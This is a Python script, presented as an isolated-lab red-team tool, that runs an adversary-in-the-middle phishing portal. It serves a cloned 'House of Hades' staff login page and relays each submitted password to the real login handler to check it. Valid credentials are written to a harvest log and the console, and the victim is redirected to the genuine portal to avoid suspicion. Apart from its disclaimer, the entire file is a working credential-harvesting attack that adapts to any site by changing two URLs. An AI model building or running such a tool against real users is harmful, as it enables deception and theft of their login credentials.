#!/usr/bin/env python3
# ============================================================================
#  House of Hades - phishing portal (Adversary-in-the-Middle credential harvest)
#  ISOLATED LAB ONLY. Authorised red-team assessment. Do not deploy anywhere real.
#
#  Serves a pixel clone of the real staff portal. When a victim submits
#  credentials, it RELAYS them to the REAL login to validate them (the attacker
#  cannot reach the DC, so the real portal is the validation oracle):
#    - valid   -> log the credential and redirect the victim to the real portal
#    - invalid -> re-show the form with an error, forcing a realistic retry
#
#  Run on the attacker box (Kali):  python3 phish_server.py
#  Then send victims to:            http://<kali-ip>:8080/
# ============================================================================
import http.server
import socketserver
import urllib.parse
import urllib.request
import datetime
import os

# ----- config -----
LISTEN_PORT  = 8080
REAL_LOGIN   = "http://10.1.1.10/cgi-bin/login.py"   # validation oracle (real handler)
REAL_PORTAL  = "http://10.1.1.10/login.html"         # where the victim is sent after capture
HARVEST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "harvested.log")

PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>House of Hades — Underworld Staff Portal</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700&family=IBM+Plex+Sans:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
  :root{
    --void:#0A0604; --raised:#160F09; --sunk:#0a0604;
    --line:#3a2817; --line-soft:#271a0e;
    --paper:#EEDFC6; --muted:#A78A63; --muted-dim:#6E5636;
    --gold:#C98A34; --gold-bright:#E7C877; --gold-dim:#7D5A24;
  }
  *{box-sizing:border-box}
  body{
    margin:0; min-height:100vh; color:var(--paper);
    font-family:"IBM Plex Sans",system-ui,sans-serif;
    background:
      radial-gradient(900px 540px at 50% -15%, rgba(201,138,52,.12), transparent 60%),
      var(--void);
    display:flex; align-items:center; justify-content:center; padding:1.5rem;
  }
  .card{
    width:100%; max-width:370px;
    background:linear-gradient(180deg,var(--raised),#100b07);
    border:1px solid var(--line); border-radius:14px; padding:2.4rem 2.1rem 2rem;
    box-shadow:0 24px 70px -30px rgba(0,0,0,.8), inset 0 1px 0 rgba(231,200,119,.05);
  }
  .crest{
    width:54px; height:54px; margin:0 auto .9rem; border-radius:50%;
    border:1.5px solid var(--gold-dim); display:flex; align-items:center; justify-content:center;
    font-size:27px; color:var(--gold-bright);
    background:radial-gradient(circle at 50% 35%, rgba(201,138,52,.18), transparent 70%);
  }
  h1{
    font-family:"Cinzel",serif; font-weight:700; font-size:1.3rem; letter-spacing:.06em;
    text-transform:uppercase; text-align:center; margin:0 0 .25rem; color:var(--gold-bright);
  }
  .sub{
    text-align:center; font-family:"JetBrains Mono",monospace; font-size:.68rem;
    letter-spacing:.22em; text-transform:uppercase; color:var(--muted-dim); margin:0 0 1.9rem;
  }
  .err{color:#E5442A; font-family:"JetBrains Mono",monospace; font-size:.68rem;
    text-align:center; margin:-1.1rem 0 1.2rem; letter-spacing:.04em;}
  label{
    display:block; font-family:"JetBrains Mono",monospace; font-size:.66rem;
    letter-spacing:.16em; text-transform:uppercase; color:var(--muted); margin:0 0 .4rem;
  }
  input{
    width:100%; padding:.72rem .8rem; margin-bottom:1.15rem; background:var(--sunk);
    border:1px solid var(--line); border-radius:8px; color:var(--paper);
    font-family:"JetBrains Mono",monospace; font-size:.92rem; outline:none;
    transition:border-color .15s, box-shadow .15s;
  }
  input:focus{border-color:var(--gold); box-shadow:0 0 0 3px rgba(201,138,52,.14)}
  button{
    width:100%; padding:.8rem; border:none; border-radius:8px; cursor:pointer; margin-top:.2rem;
    background:linear-gradient(180deg,var(--gold-bright),var(--gold-dim)); color:#1a1006;
    font-family:"Cinzel",serif; font-weight:700; letter-spacing:.1em; text-transform:uppercase; font-size:.85rem;
    transition:filter .15s, transform .05s;
  }
  button:hover{filter:brightness(1.07)}
  button:active{transform:translateY(1px)}
  .foot{
    text-align:center; font-family:"JetBrains Mono",monospace; font-size:.62rem;
    letter-spacing:.1em; color:var(--muted-dim); margin-top:1.7rem; line-height:1.7;
  }
  .foot b{color:var(--gold)}
</style>
</head>
<body>
  <main class="card">
    <div class="crest">&#9906;</div>
    <h1>House of Hades</h1>
    <p class="sub">Underworld Staff Portal</p>
    <!--ERR-->
    <form action="/" method="POST" autocomplete="off">
      <label for="username">Keeper ID</label>
      <input type="text" id="username" name="username" required>
      <label for="password">Passphrase</label>
      <input type="password" id="password" name="password" required>
      <button type="submit">Descend</button>
    </form>
    <p class="foot">Authorised wardens of Tartarus only<br><b>&#10013;</b> by order of the Lord of the Dead</p>
  </main>
</body>
</html>
"""

ERR_HTML = '<p class="err">Incorrect credentials. Please try again.</p>'


def validate(username, password):
    """Relay the credentials to the REAL portal; True if it grants access."""
    data = urllib.parse.urlencode({"username": username, "password": password}).encode()
    try:
        resp = urllib.request.urlopen(REAL_LOGIN, data=data, timeout=10)
        body = resp.read().decode("utf-8", "replace")
        return "Access granted" in body
    except Exception:
        return False


def log_attempt(src, username, password, ok):
    stamp = datetime.datetime.now().isoformat(timespec="seconds")
    line = "%s\t%s\t%s\t%s\t%s\n" % (stamp, src, username, password, "VALID" if ok else "invalid")
    try:
        with open(HARVEST_FILE, "a", encoding="utf-8") as fh:
            fh.write(line)
    except OSError:
        pass
    tag = "[+] VALID" if ok else "[-] invalid"
    print("%s  %s : %s  (from %s)" % (tag, username, password, src))


class Handler(http.server.BaseHTTPRequestHandler):
    def _send_page(self, error=False):
        body = PAGE.replace("<!--ERR-->", ERR_HTML if error else "")
        data = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        self._send_page()

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length).decode("utf-8", "replace")
        fields = urllib.parse.parse_qs(body)
        username = fields.get("username", [""])[0]
        password = fields.get("password", [""])[0]
        ok = validate(username, password)
        log_attempt(self.client_address[0], username, password, ok)
        if ok:
            # Valid: send the victim to the real portal so nothing looks off.
            self.send_response(302)
            self.send_header("Location", REAL_PORTAL)
            self.end_headers()
        else:
            # Invalid: real login behaviour -> show an error and let them retry.
            self._send_page(error=True)

    def log_message(self, *args):
        pass  # keep the console clean; we print our own capture lines


if __name__ == "__main__":
    print("[*] House of Hades phishing portal")
    print("[*] Listening on http://0.0.0.0:%d/" % LISTEN_PORT)
    print("[*] Validating against : %s" % REAL_LOGIN)
    print("[*] Victims redirected to: %s" % REAL_PORTAL)
    print("[*] Captured credentials : %s" % HARVEST_FILE)
    print("[*] Ctrl+C to stop.\n")
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", LISTEN_PORT), Handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Stopped.")
